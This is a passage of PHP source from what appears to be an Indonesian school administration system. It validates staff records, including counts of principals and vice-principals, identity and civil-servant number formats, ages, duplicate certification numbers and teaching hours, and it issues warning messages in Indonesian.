                    $nama_kepper = array();
                    $jml_keplab = 0;
                    $nama_keplab = array();

                    $namaKepsekTemp = array();
                    $namaPltKepsekTemp = array();
                    $namaKepsekNonIndukTemp = array();
                    $namaPltKepsekNonIndukTemp = array();
                    $namaWakasekTemp = array();
                    $namaKepperTemp = array();
                    $namaKeplabTemp = array();

                    $tugasTambahanDobelArr = array();
                    $tugasTambahanDobelNamaArr = array();

                    $c = new \Criteria();
                    $c->addJoin(TugasTambahanPeer::PTK_ID, PtkPeer::PTK_ID, \Criteria::JOIN);
                    $c->addJoin(PtkPeer::PTK_ID, PtkTerdaftarPeer::PTK_ID, \Criteria::JOIN);
                    $c->add(TugasTambahanPeer::JABATAN_PTK_ID, array(2,3,7,11,33,34,35,36,46,151,153,155), \Criteria::IN);
                    // $c->add(TugasTambahanPeer::JABATAN_PTK_ID, array(2,3,7,11,33,151,153,155), \Criteria::IN);
                    // 2:Kepsek, 3: Kepala Perpus, 7: Kepala Lab, 11:Wakasek, 33:PLT Kepsek
                    $c->add(TugasTambahanPeer::SEKOLAH_ID, $sekolah_id);
                    $c->add(TugasTambahanPeer::SOFT_DELETE, 0);
                    // $c->add(TugasTambahanPeer::TST_TAMBAHAN, NULL, \Criteria::ISNULL);
                    $c->add(PtkPeer::SOFT_DELETE, 0);
                    $c->add(PtkTerdaftarPeer::TAHUN_AJARAN_ID, $tahunAjaranId);
                    $c->add(PtkTerdaftarPeer::SOFT_DELETE, 0);
                    $c->add(PtkTerdaftarPeer::JENIS_KELUAR_ID, NULL, \Criteria::ISNULL);
                    $c->add(PtkTerdaftarPeer::SEKOLAH_ID, $sekolah_id);
                    // $c->add(PtkTerdaftarPeer::PTK_INDUK, 1);

                    $cton1 = $c->getNewCriterion(TugasTambahanPeer::TST_TAMBAHAN, NULL, \Criteria::ISNULL);
                    $cton2 = $c->getNewCriterion(TugasTambahanPeer::TST_TAMBAHAN, date('Y-m-d H:i:s'), \Criteria::GREATER_THAN);

                    $cton1->addOr($cton2);
                    //$cton3->addAnd($cton4);

                    $c->addAnd($cton1);

                    $kepsek = TugasTambahanPeer::doSelect($c);
                    $kepsekCount = TugasTambahanPeer::doCount($c);

                    foreach ($kepsek as $k) {
                        $tgsTambahan = $k->getJabatanPtkId();

                        $c = new \Criteria();
                        $c->add(PtkTerdaftarPeer::PTK_ID, $k->getPtkId());
                        $c->add(PtkTerdaftarPeer::TAHUN_AJARAN_ID, $tahunAjaranId);
                        $c->add(PtkTerdaftarPeer::SOFT_DELETE, 0);
                        $c->add(PtkTerdaftarPeer::JENIS_KELUAR_ID, NULL, \Criteria::ISNULL);
                        $c->add(PtkTerdaftarPeer::SEKOLAH_ID, $sekolah_id);
                        $ptkTerdaftarObj = PtkTerdaftarPeer::doSelectOne($c);

                        if (is_object($ptkTerdaftarObj)) {

                        	if ($ptkTerdaftarObj->getPtkInduk() == 1) {

		                        if (in_array($tgsTambahan, array(2, 151, 153, 155))
                                    && in_array($k->getPtk()->getJenisPtkId(), array(20, 57))) {
		                            // kepala sekolah
		                            $jml_kepsek++;
		                            $namaKepsekTemp[] = $k->getPtk()->getNama();
		                        } else if ($tgsTambahan == 33) {
                                    // PLT Kepsek
                                    $jml_plt_kepsek++;
                                    $namaPltKepsekTemp[] = $k->getPtk()->getNama();
                                } else if ($tgsTambahan == 3) {
		                            // kepala perpustakaan
		                            $jml_kepper++;
		                            $namaKepperTemp[] = $k->getPtk()->getNama();
		                        } else if ($tgsTambahan == 7) {
		                            // kepala laboratorium
		                            $jml_keplab++;
		                            $namaKeplabTemp[] = $k->getPtk()->getNama();
		                        // } else if ($tgsTambahan == 11) {
                                } else if (in_array($tgsTambahan, array(11,34,35,36,46))) {
		                            // wakil kepala sekolah
		                            $jml_wakasek++;
		                            $namaWakasekTemp[] = $k->getPtk()->getNama();
		                        }

                        	} else {
                        		// if ($tgsTambahan == 2) {
                                if (in_array($tgsTambahan, array(2, 151, 153, 155))
                                    && in_array($k->getPtk()->getJenisPtkId(), array(20, 57))) {
		                            // kepala sekolah
		                            $jml_kepsek_non_induk++;
		                            $namaKepsekNonIndukTemp[] = $k->getPtk()->getNama();
		                        } else if ($tgsTambahan == 33) {
                                    $jml_plt_kepsek_non_induk++;
                                    $namaPltKepsekNonIndukTemp[] = $k->getPtk()->getNama();
                                }
                        	}

                        }
                    }

                    $nama_kepsek = implode(", ", $namaKepsekTemp);
                    $nama_plt_kepsek = implode(", ", $namaPltKepsekTemp);
                    $nama_kepsek_non_induk = implode(", ", $namaKepsekNonIndukTemp);
                    $nama_wakasek = implode(", ", $namaWakasekTemp);
                    $nama_kepper = implode(", ", $namaKepperTemp);
                    $nama_keplab = implode(", ", $namaKeplabTemp);

                	if ($jml_kepsek_non_induk > 0) {
                		$keterangan = "Terdeteksi <b>Kepala Sekolah</b> ada di sekolah non induk";
                        $this->setArrValidation($i++, "ptk", 2, $keterangan);
                	}

                    if ($jml_kepsek > 1) {
                        $keterangan = "<b>Kepala Sekolah</b> tidak diperkenankan lebih dari 1, a/n <b>{$nama_kepsek}</b>";
                        $this->setArrValidation($i++, "ptk", 2, $keterangan);
                    } else if ($jml_kepsek < 1) {

                        if (($jml_plt_kepsek+$jml_plt_kepsek_non_induk) < 1) {
                            $keterangan = "<b>Kepala Sekolah</b> belum dipilih</b> dan tidak ada <b>PLT Kepala Sekolah</b> yang menjabat";
                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                        } else if ($jml_plt_kepsek > 0) {
                            $keterangan = "Tugas Tambahan sebagai <b>PLT Kepala Sekolah</b> dipilih disekolah induk (a/n <b>".$nama_plt_kepsek."</b>)";
                            $this->setArrValidation($i++, "ptk", 1, $keterangan);
                        } else if (($jml_plt_kepsek+$jml_plt_kepsek_non_induk) > 1) {
                            $keterangan = "Tugas Tambahan sebagai <b>PLT Kepala Sekolah</b> tidak diperkenankan lebih dr 1, a/n <b>{$nama_plt_kepsek}, {$nama_kepsek_non_induk}</b>";
                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                        }
                    } else {
                        if (($jml_kepsek+$jml_plt_kepsek+$jml_plt_kepsek_non_induk) > 1) {
                            $keterangan = "Terdeteksi masih ada yang menjabat sebagai Kepala Sekolah dan PLT Kepala Sekolah";
                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                        }
                    }

                	if ($jml_keplab > 0 && $countPrasaranaLab < 1) {
                		// $keterangan = "Tugas Tambahan sebagai <b>Kepala Laboratorium</b> tidak diperkenankan lebih dari total jenis prasarana laboratorium yang ada";
                		// $this->setArrValidation($i++, "ptk", 2, $keterangan);
                        $keterangan = "Terdeteksi data tidak wajar. GTK a/n <b>{$nama_keplab}</b> sebagai kepala laboratorium, namun sekolah tidak memiliki prasarana dengan jenis Laboratorium. Periksa kembali kebenaran data tersebut";
                        $this->setArrValidation($i++, "ptk", 1, $keterangan);
                	}

                    if ($jml_wakasek > 0 && in_array($bentukPendidikan, $sd)) {
                        $keterangan = "Sesuai peraturan <b>{$bentukPendidikanNama}</b> tidak diperkenankan memiliki <b>Wakil Kepala Sekolah</b>, a/n <b>{$nama_wakasek}</b>";
                        $this->setArrValidation($i++, "ptk", 2, $keterangan);
                    }

                    $c = new \Criteria();
                    $c->add(RombonganBelajarPeer::SEKOLAH_ID, $sekolah_id);
                    $c->add(RombonganBelajarPeer::SEMESTER_ID, $sessionSemester);
                    $c->add(RombonganBelajarPeer::SOFT_DELETE, 0);
                    $c->add(RombonganBelajarPeer::JENIS_ROMBEL, array(1,8,9,10,11,12,13), \Criteria::IN);
                    $jmlRombel = RombonganBelajarPeer::doCount($c);
                    $rom = ceil($jmlRombel/9);

                    if(in_array($bentukPendidikan, $smp)){
                        if ($jml_wakasek > 3) {
                            $keterangan = "<b>Wakil Kepala Sekolah</b> tidak diperkenankan lebih dari 3, a/n <b>{$nama_wakasek}</b>";
                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                        } else if ($jml_wakasek > 0) {
                            if ($jml_wakasek > $rom) {
                                $keterangan = "<b>Wakil Kepala Sekolah</b> tidak diperkenankan lebih dari {$rom} GTK, seorang wakasek hanya untuk 9 rombel. A/n <b>{$nama_wakasek}</b>";
                                $this->setArrValidation($i++, "ptk", 2, $keterangan);
                            }
                        }
                    }

                    if(in_array($bentukPendidikan, $dikmen)){

                        if ($jml_wakasek > 4) {
                            $keterangan = "<b>Wakil Kepala Sekolah</b> tidak diperkenankan lebih dari 4, a/n <b>{$nama_wakasek}</b>";
                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                        } else if ($jml_wakasek > 1) {
                            if ($jml_wakasek > $rom) {
                                $keterangan = "<b>Wakil Kepala Sekolah</b> tidak diperkenankan lebih dari {$rom} GTK, seorang wakasek hanya untuk 9 rombel. A/n <b>{$nama_wakasek}</b>";
                                $this->setArrValidation($i++, "ptk", 2, $keterangan);
                            }
                        }

                        $c = new \Criteria();
                        $c->addJoin(TugasTambahanPeer::PTK_ID, PtkPeer::PTK_ID, \Criteria::JOIN);
                        $c->addJoin(PtkPeer::PTK_ID, PtkTerdaftarPeer::PTK_ID, \Criteria::JOIN);
                        $c->add(TugasTambahanPeer::JABATAN_PTK_ID, array(34,35,36,37,38,39,46), \Criteria::IN);
                        // 34,35,36,46,37,38,39
                        $c->add(TugasTambahanPeer::SEKOLAH_ID, $sekolah_id);
                        $c->add(TugasTambahanPeer::SOFT_DELETE, 0);
                        $c->add(PtkPeer::SOFT_DELETE, 0);
                        $c->add(PtkTerdaftarPeer::TAHUN_AJARAN_ID, $tahunAjaranId);
                        $c->add(PtkTerdaftarPeer::SOFT_DELETE, 0);
                        $c->add(PtkTerdaftarPeer::JENIS_KELUAR_ID, NULL, \Criteria::ISNULL);

                        $cton1 = $c->getNewCriterion(TugasTambahanPeer::TST_TAMBAHAN, NULL, \Criteria::ISNULL);
                        $cton2 = $c->getNewCriterion(TugasTambahanPeer::TST_TAMBAHAN, date('Y-m-d H:i:s'), \Criteria::GREATER_THAN);
                        $cton1->addOr($cton2);
                        $c->add($cton1);

                        // print_r($c->toString()); die;
                        $countKepsek = TugasTambahanPeer::doSelect($c);
                        // print_r($countKepsek); die;

                        foreach ($countKepsek as $ck) {

                            if($ck->getTstTambahan() > date() && in_array($ck->getJabatanPtkId(), array(34,35,36,46))){
                                $countKS++;
                            }

                            $tugasTambahanDobelArr[$ck->getJabatanPtkId()] += 1;
                            $tugasTambahanDobelNamaArr[$ck->getJabatanPtkId()] .= $ck->getPtk()->getNama().", ";
                        }

                        // perhitungan wakasek mengikuti rasio rombel
                        /*if($countKS > 4){
                            $keterangan = "<b>Wakil Kepala Sekolah</b> tidak diperkenankan lebih dari 4. (Jumlah Wakil kepala sekolah saat ini: <b style=color:red>".$countKS."</b>)";
                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                        }*/

                        // if ($sekolahObj->getBentukPendidikanId() == 15) {

                        $c = new \Criteria();
                        $c->add(JabatanTugasPtkPeer::JABATAN_PTK_ID, array(34,35,36,37,38,39,46), \Criteria::IN);
                        $cton1 = $c->getNewCriterion(JabatanTugasPtkPeer::EXPIRED_DATE, NULL, \Criteria::ISNULL);
                        $cton2 = $c->getNewCriterion(JabatanTugasPtkPeer::EXPIRED_DATE, date('Y-m-d H:i:s'), \Criteria::GREATER_THAN);
                        $cton1->addOr($cton2);
                        $c->add($cton1);
                        $tugasTambahanDikmenObj = JabatanTugasPtkPeer::doSelect($c);

                        // print_r($tugasTambahanDobelArr); die;
                        foreach ($tugasTambahanDikmenObj as $value) {

                            if ($tugasTambahanDobelArr[$value->getJabatanPtkId()] > 1 && in_array($value->getJabatanPtkId(), array(34,35,36,46))) {
                                // wakasek
                                $keterangan = "Tugas Tambahan sebagai <b>{$value->getNama()}</b> terdeteksi lebih dari satu PTK (".$tugasTambahanDobelNamaArr[$value->getJabatanPtkId()].")";
                                $this->setArrValidation($i++, "ptk", 2, $keterangan);
                            } else if ($value->getJabatanPtkId() == 37) {
                                // Kepala Bengkel
                                // echo $tugasTambahanDobelArr[$value->getJabatanPtkId()]; die;
                                $sql = "select
                                            jurusan.jurusan_id,
                                            count(1) jml_rombel
                                        from rombongan_belajar
                                        inner join jurusan_sp on rombongan_belajar.jurusan_sp_id = jurusan_sp.jurusan_sp_id
                                        inner join ref.jurusan on jurusan_sp.jurusan_id = jurusan.jurusan_id
                                        where
                                            rombongan_belajar.sekolah_id = '{$sekolah_id}'
                                            and rombongan_belajar.semester_id = '{$sessionSemester}'
                                            and rombongan_belajar.soft_delete = 0
                                            and jurusan_sp.sekolah_id = '{$sekolah_id}'
                                            and jurusan_sp.soft_delete = 0
                                            and jurusan.expired_date is null
                                            and jurusan.level_bidang_id = '12'
                                        group by
                                            jurusan.jurusan_id";
                                $kepalaBengkels = getDataBySql($sql, FALSE, DBNAME);
                                $arrNamaKepalaBengkel = array();
                                foreach ($kepalaBengkels as $pk) {
                                    $jurusanObj = JurusanPeer::retrieveByPK($pk['jurusan_id']);

                                    if (!is_object($jurusanObj)) {
                                        continue;
                                    }

                                    $arrNamaKepalaBengkel[] = $jurusanObj->getNamaJurusan();
                                }
                                $namaKepalaBengkel = implode(", ", $arrNamaKepalaBengkel);

                                if ($tugasTambahanDobelArr[$value->getJabatanPtkId()] > sizeof($kepalaBengkels)) {
                                    $keterangan = "Tugas Tambahan sebagai <b>Kepala Bengkel</b> dengan nama PTK (<b>".$tugasTambahanDobelNamaArr[$value->getJabatanPtkId()]."</b>) melebihi dari Kompetensi Keahlian yang diajarkan di sekolah (saat ini berjumlah ".sizeof($kepalaBengkels)." yaitu <b>".$namaKepalaBengkel."</b>)";
                                    $this->setArrValidation($i++, "ptk", 1, $keterangan);
                                }

                            } else if ($value->getJabatanPtkId() == 38) {
                                // Kepala Program Keahlian
                                // echo $tugasTambahanDobelArr[$value->getJabatanPtkId()]; die;
                                $sql = "select
                                            left(jurusan_sp.jurusan_id, 5) jurusan_id,
                                            count(1)
                                        from rombongan_belajar
                                        inner join jurusan_sp on rombongan_belajar.jurusan_sp_id = jurusan_sp.jurusan_sp_id
                                        where
                                            rombongan_belajar.sekolah_id = '{$sekolah_id}'
                                            and rombongan_belajar.semester_id = '{$sessionSemester}'
                                            and rombongan_belajar.soft_delete = 0
                                            and jurusan_sp.sekolah_id = '{$sekolah_id}'
                                            and jurusan_sp.soft_delete = 0
                                        group by
                                            left(jurusan_sp.jurusan_id, 5)";

                                $programKeahlians = getDataBySql($sql, FALSE, DBNAME);
                                $arrNamaJurusanProgramKeahlian = array();
                                foreach ($programKeahlians as $pk) {
                                    $jurusanObj = JurusanPeer::retrieveByPK($pk['jurusan_id']);

                                    if (!is_object($jurusanObj)) {
                                        continue;
                                    }

                                    $arrNamaJurusanProgramKeahlian[] = $jurusanObj->getNamaJurusan();
                                }
                                $namaJurusanProgramKeahlian = implode(", ", $arrNamaJurusanProgramKeahlian);

                                if ($tugasTambahanDobelArr[$value->getJabatanPtkId()] > sizeof($programKeahlians)) {
                                    $keterangan = "Tugas Tambahan sebagai <b>Kepala Program Keahlian</b> dengan nama PTK (<b>".$tugasTambahanDobelNamaArr[$value->getJabatanPtkId()]."</b>) melebihi dari Program Keahlian yang diajarkan di sekolah (saat ini berjumlah ".sizeof($programKeahlians)." yaitu <b>".$namaJurusanProgramKeahlian."</b>)";
                                    $this->setArrValidation($i++, "ptk", 1, $keterangan);
                                }

                            } else if ($value->getJabatanPtkId() == 39) {
                                // Kepala Unit Produksi
                                // echo $tugasTambahanDobelArr[$value->getJabatanPtkId()]; die;
                                $c = new \Criteria();
                                $c->add(UnitUsahaPeer::SEKOLAH_ID, $sekolah_id);
                                $c->add(UnitUsahaPeer::SOFT_DELETE,0);
                                $unitUsahaObj = UnitUsahaPeer::doSelect($c);

                                $arrNamaUnitUsaha = array();
                                foreach ($unitUsahaObj as $unit) {
                                    $arrNamaUnitUsaha[] = $unit->getNamaUnitUsaha();
                                }
                                $namaUnitUsaha = implode(", ", $arrNamaUnitUsaha);

                                if ($tugasTambahanDobelArr[$value->getJabatanPtkId()] > sizeof($unitUsahaObj)) {
                                   $keterangan = "Tugas Tambahan sebagai <b>Kepala Unit Produksi</b> dengan nama PTK (<b>".$tugasTambahanDobelNamaArr[$value->getJabatanPtkId()]."</b>) tidak diperkenankan lebih dari Unit Produksi yang diadakan sekolah (saat ini berjumlah ".sizeof($unitUsahaObj)." yaitu <b>".$namaUnitUsaha."</b>)";
                                   $this->setArrValidation($i++, "ptk", 1, $keterangan);
                                }
                            }
                        }
                    }

                    $jenisPtkIdGuruArr = array(3,4,5,6,12,13,14);
                    $jmlTendik = 0;

                    $sql = "SELECT 
                                ptk_terdaftar.sekolah_id,
                                ptk_terdaftar.ptk_terdaftar_id,
                                ptk_terdaftar.ptk_id,
                                SUM(pembelajaran.jam_mengajar_per_minggu) AS jml_mengajar 
                            FROM pembelajaran
                            JOIN ptk_terdaftar ON pembelajaran.ptk_terdaftar_id = ptk_terdaftar.ptk_terdaftar_id 
                                AND ptk_terdaftar.jenis_keluar_id IS NULL 
                                AND ptk_terdaftar.tahun_ajaran_id = '{$tahunAjaranId}'
                            JOIN rombongan_belajar ON pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                            WHERE 
                                pembelajaran.soft_delete = 0
                                AND rombongan_belajar.soft_delete = 0
                                AND rombongan_belajar.semester_id = '{$sessionSemester}'
                                AND ptk_terdaftar.sekolah_id = rombongan_belajar.sekolah_id
                            	AND rombongan_belajar.sekolah_id = '{$sekolah_id}'
                            GROUP BY
                                ptk_terdaftar.sekolah_id,
                                ptk_terdaftar.ptk_terdaftar_id,
                                ptk_terdaftar.ptk_id";
                    
                    $jumlahJamMengajarPerMingguArr = getDataBySql($sql, false, DBNAME);
                    $jumlahJamMengajarPerMingguPerPtkArr = array();
                    foreach ($jumlahJamMengajarPerMingguArr as $jjm) {
                        $jumlahJamMengajarPerMingguPerPtkArr[$jjm['ptk_id']] = $jjm;
                    }

                    $sql = "select 
                                nuks
                            from ptk 
                            join ptk_terdaftar on ptk.ptk_id = ptk_terdaftar.ptk_id
                            where 
                                ptk.soft_delete = 0
                                and ptk_terdaftar.sekolah_id = '{$sekolah_id}'
                                and ptk_terdaftar.tahun_ajaran_id = '{$tahunAjaranId}'
                                and ptk_terdaftar.soft_delete = 0
                                and ptk_terdaftar.jenis_keluar_id is null
                                and ptk.nuks is not null
                            group by
                                nuks
                            having count(1) > 1";
                    $dataNuksDobelArr = getDataBySql($sql, false, DBNAME);
                    foreach ($dataNuksDobelArr as $nuks) {
                        $nuksDobelArr[] = $nuks['nuks'];
                    }
                    
                    $variabel = ['nomor_sertifikat', 'nomor_peserta'];
                    foreach ($variabel as $var) {
                        $sql = "select 
                                    {$var},
                                    count(1) as jumlah
                                from ptk 
                                join ptk_terdaftar on ptk.ptk_id = ptk_terdaftar.ptk_id
                                join rwy_sertifikasi on ptk.ptk_id = rwy_sertifikasi.ptk_id
                                where 
                                    ptk.soft_delete = 0
                                    and ptk_terdaftar.sekolah_id = '{$sekolah_id}'
                                    and ptk_terdaftar.tahun_ajaran_id = '{$tahunAjaranId}'
                                    and ptk_terdaftar.soft_delete = 0
                                    and ptk_terdaftar.jenis_keluar_id is null
                                    and rwy_sertifikasi.id_jenis_sertifikasi = 1
                                    and rwy_sertifikasi.soft_delete = 0
                                group by 
                                    {$var}
                                having count(1) > 1";
                            // echo $sql; die;

                        $dataVarDobel = getDataBySql($sql, false, DBNAME);
                        foreach ($dataVarDobel as $key) {
                            if ($var == 'nomor_sertifikat') {
                                $dataNoSerDobelArr[] = $key[$var];
                            } else if ($var == 'nrg') {
                                $dataNrgDobelArr[] = $key[$var];
                            } else if ($var == 'nomor_peserta') {
                                $dataNoPesDobelArr[] = $key[$var];
                            }
                        }
                    }

                    // print_r($dataNoSerDobelArr);
                    // print_r($dataNrgDobelArr);
                    // print_r($dataNoPesDobelArr);
                    // die();

                    $ptkNuksDobelArr = [];
                    $ptkNoSerDobelArr = [];
                    // $ptkNrgDobelArr = [];
                    $ptkNoPesDobelArr = [];
                    $jumlahGtkSertifikasiIndustri = 0;
                    foreach ($ptks as $ptk) {

                        $ptk_id = $ptk->getPtkId();
                        $status_kepegawaian = $ptk->getStatusKepegawaianId();

                        // cek ptk_terdaftar / penugasan
                        $c = new \Criteria();
                        $c->add(PtkTerdaftarPeer::PTK_ID, $ptk->getPtkId());
                        $c->add(PtkTerdaftarPeer::TAHUN_AJARAN_ID, $tahunAjaranId);
                        $c->add(PtkTerdaftarPeer::SEKOLAH_ID, $sekolahObj->getSekolahId());
                        // $c->add(PtkTerdaftarPeer::JENIS_KELUAR_ID, NULL, \Criteria::ISNULL);
                        $c->add(PtkTerdaftarPeer::SOFT_DELETE, 0);
                        $countPtkTers = PtkTerdaftarPeer::doCount($c);
                        $ptkTerd = PtkTerdaftarPeer::doSelectOne($c);

                        if ($countPtkTers < 1) {
                            // $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> belum terdaftar pada <b>Tahun Ajaran {$tahunAjaranId}</b>. Perbaiki dengan tombol <b>Penugasan</b>";
                            // $this->setArrValidation($i++, "ptk", 2, $keterangan);
                        } else {
                            if ($ptkTerd->getJenisKeluarId()) {
                                continue;
                            }
                        }

                        if (in_array($ptk->getNuks(), $nuksDobelArr)) {
                            $ptkNuksDobelArr[$ptk->getNuks()][] = $ptk->getNama();
                        }

                        if (!in_array($ptk->getJenisPtkId(), array(3,4,6,12,13,57))) {
                            // tendik
                            $jmlTendik++;
                        } else {
                            // guru
                            if (!array_key_exists($ptk->getPtkId(), $jumlahJamMengajarPerMingguPerPtkArr)) {
                                // print_r($jumlahJamMengajarPerMingguPerPtkArr);
                                $keterangan = "Guru a/n <b>{$ptk->getNama()}</b> tidak memiliki jam mengajar pada rombongan belajar";
                                $this->setArrValidation($i++, "ptk", 1, $keterangan);
                            } else {
                                if ($jumlahJamMengajarPerMingguPerPtkArr[$ptk->getPtkId()]['jml_mengajar'] < 1) {
                                    $keterangan = "Guru a/n <b>{$ptk->getNama()}</b> tidak memiliki jam mengajar pada rombongan belajar";
                                    $this->setArrValidation($i++, "ptk", 1, $keterangan);
                                }
                            }
                        }

                        $nik_new = str_replace("0000000", "", $ptk->getNik());
                        $nik_num = preg_replace("/[^0-9]+/", "", $nik_new);
                        if ($ptk->getNik()) {
                            $cekNik = $ptk->getNik();
                        } else {
                            $cekNik = "Tidak diisi";
                        }
                        if (strlen($nik_num) != 16) {
                            if ($ptk->getKewarganegaraan() == "ID") {
                                $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> harap mengisikan NIK <b>(Isian saat ini:{$cekNik})</b> dengan benar";
                                if (!in_array($kodeProp, $prop3T)) {
                                    $this->setArrValidation($i++, "ptk", 2, $keterangan);
        
                                    $this->setTriggerValidation($app, "ptk", $ptk->getPtkId(), "nik", $keterangan);
                                } else {
                                    $this->setArrValidation($i++, "ptk", 1, $keterangan);
                                }
                            }
                        }

                        if ($ptk->getKewarganegaraan() != "ID") {
                            $c = new \Criteria();
                            $c->add(KitasPtkPeer::PTK_ID, $ptk->getPtkId());
                            $c->add(KitasPtkPeer::SOFT_DELETE, 0);
                            $jmlKitasPtk = KitasPtkPeer::doCount($c);

                            if ($jmlKitasPtk < 1) {
                                $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> harap mengisikan No KITAS dikarenakan Warga Negara Asing (WNA)";
                                $this->setArrValidation($i++, "ptk", 2, $keterangan);
                            }
                        }

                        if ($ptk->getMstWilayah()->getIdLevelWilayah() != 3) {
                            $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> salah dalam mengisi kecamatan";
                            $this->setArrValidation($i++, "ptk", 1, $keterangan);
                        }

                        if (!$ptk->getEmail()) {
                            $keterangan = "GTK a/n <b>{$ptk->getNama()}</b>, email harap diisi";
                            $this->setArrValidation($i++, "ptk", 1, $keterangan);

                        }

                        if($this->getUsiaPtk($ptk->getTanggalLahir()) <= 15){
                            $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> berumur kurang dari 15 tahun. (Umur saat ini = ".$this->getUsiaPtk($ptk->getTanggalLahir())." tahun)";
                            $this->setArrValidation($i++, "ptk", 2, $keterangan);

                            // trigger vld ptkf
                            $this->setTriggerValidation($app, "ptk", $ptk->getPtkId(), "tanggal_lahir", $keterangan);
                            /*$c = new \Criteria();
                            $c->add(VldPtkPeer::PTK_ID, $ptk->getPtkId());
                            $c->add(VldPtkPeer::SOFT_DELETE, 0);
                            $c->add(VldPtkPeer::STATUS_VALIDASI, array(1,2,3), \Criteria::IN);
                            $c->add(VldPtkPeer::FIELD_ERROR, "tanggal_lahir");
                            $vldPtkObj = VldPtkPeer::doSelectOne($c);

                            if (!is_object($vldPtkObj)) {
                                $uuid = pg_gen_uuid(VldPtkPeer::DATABASE_NAME);
                                $vldPtkObj = new VldPtk();
                                $vldPtkObj->setLogid($uuid);
                                $vldPtkObj->setCreateDate(getCreateDate($vldPtkObj->getLastSync(), $app));
                            }
                            $vldPtkObj->setStatusValidasi(1);
                            $vldPtkObj->setPtkId($ptk->getPtkId());
                            $vldPtkObj->setIdtype(2001);
                            $vldPtkObj->setFieldError("tanggal_lahir");
                            $vldPtkObj->setErrorMessage($keterangan);
                            $vldPtkObj->setAppUsername("validation_trigger");
                            $vldPtkObj->setSoftDelete(0);
                            $vldPtkObj->setUpdaterId('90915957-31F5-E011-819D-43B216F82ED4');
                            $vldPtkObj->setLastUpdate(getLastUpdate($vldPtkObj->getLastSync(), $app));
                            $vldPtkObj->setLastSync(getLastSync($vldPtkObj->getLastSync(), $app));
                            $vldPtkObj->save();*/
                        }

                        if ($this->getUsiaPtk($ptk->getTanggalLahir()) > 70){
                            $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> berumur lebih dari 70 tahun. (Umur saat ini = ".$this->getUsiaPtk($ptk->getTanggalLahir())." tahun)";
                            $this->setArrValidation($i++, "ptk", 1, $keterangan);
                        } else if($this->getUsiaPtk($ptk->getTanggalLahir()) >= 80){
                            $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> berumur lebih dari 80 tahun. (Umur saat ini = ".$this->getUsiaPtk($ptk->getTanggalLahir())." tahun)";
                            $this->setArrValidation($i++, "ptk", 2, $keterangan);

                            // trigger vld ptkf
                            $this->setTriggerValidation($app, "ptk", $ptk->getPtkId(), "tanggal_lahir", $keterangan);
                            /*$c = new \Criteria();
                            $c->add(VldPtkPeer::PTK_ID, $ptk->getPtkId());
                            $c->add(VldPtkPeer::SOFT_DELETE, 0);
                            $c->add(VldPtkPeer::STATUS_VALIDASI, array(1,2,3), \Criteria::IN);
                            $c->add(VldPtkPeer::FIELD_ERROR, "tanggal_lahir");
                            $vldPtkObj = VldPtkPeer::doSelectOne($c);

                            if (!is_object($vldPtkObj)) {
                                $uuid = pg_gen_uuid(VldPtkPeer::DATABASE_NAME);
                                $vldPtkObj = new VldPtk();
                                $vldPtkObj->setLogid($uuid);
                                $vldPtkObj->setCreateDate(getCreateDate($vldPtkObj->getLastSync(), $app));
                            }
                            $vldPtkObj->setStatusValidasi(1);
                            $vldPtkObj->setPtkId($ptk->getPtkId());
                            $vldPtkObj->setIdtype(2001);
                            $vldPtkObj->setFieldError("tanggal_lahir");
                            $vldPtkObj->setErrorMessage($keterangan);
                            $vldPtkObj->setAppUsername("validation_trigger");
                            $vldPtkObj->setSoftDelete(0);
                            $vldPtkObj->setUpdaterId('90915957-31F5-E011-819D-43B216F82ED4');
                            $vldPtkObj->setLastUpdate(getLastUpdate($vldPtkObj->getLastSync(), $app));
                            $vldPtkObj->setLastSync(getLastSync($vldPtkObj->getLastSync(), $app));
                            $vldPtkObj->save();*/
                        }

                        // echo $ptk->getPtkId()."<br>";
                        // if ($ptk->getPtkId() == "e317e362-45e9-48c5-8b93-7b4243152683") {
                        //     echo "countPtkTers :".$countPtkTers; die();
                        // }
                        if (in_array($status_kepegawaian, array(1,2,3,10))) {
                            // PNS Only
                            if ($countPtkTers > 0) {
                                if($ptkTerd->getPtkInduk() == 1){

                                    // jika sudah pensiun
                                    if ($this->getUsiaPtk($ptk->getTanggalLahir()) > 60) {
                                        $umurPtk = $this->getUsiaPtk($ptk->getTanggalLahir());
                                        $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> telah berumur {$umurPtk} masa PNS sudah pensiun, jika masih mengajar mohon pilih status kepegawaian non PNS";
                                        $this->setArrValidation($i++, "ptk", 2, $keterangan);

                                        $this->setTriggerValidation($app, "ptk", $ptk->getPtkId(), "status_kepegawaian_id", $keterangan);
                                    }

                                    // Jika PNS, NIP dan TMT wajib terisi
                                    if ($status_kepegawaian != 10) {
                                        $nip = $ptk->getNip();
                                        $nip_num = preg_replace("/[^0-9]+/", "", $nip);
                                        $nuptk_num = preg_replace("/[^0-9]+/", "", $ptk->getNuptk());

                                        if (strlen($nip_num) != 18) {
                                            $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> jika PNS, <b>NIP</b> wajib terisi dengan benar";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }

                                        if (strlen($nuptk_num) != 16) {
                                            $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> status kepegawaian PNS, <b>NUPTK</b> harap diisi dengan benar";
                                            $this->setArrValidation($i++, "ptk", 1, $keterangan);
                                        }

                                        $tmt_pns = $ptk->getTmtPns();
                                        if (empty($tmt_pns)) {
                                            $keterangan = "GTK a/n <b>{$ptk->getNama()}</b> jika PNS, <b>TMT PNS</b> wajib terisi";
                                            $this->setArrValidation($i++, "ptk", 2, $keterangan);
                                        }
                                    }
                                    // harus mengisi CPNS(12) dan TMT CPNS(13)
                                    $sk_cpns = $ptk->getSkCpns();
                                    if (empty($sk_cpns)) {
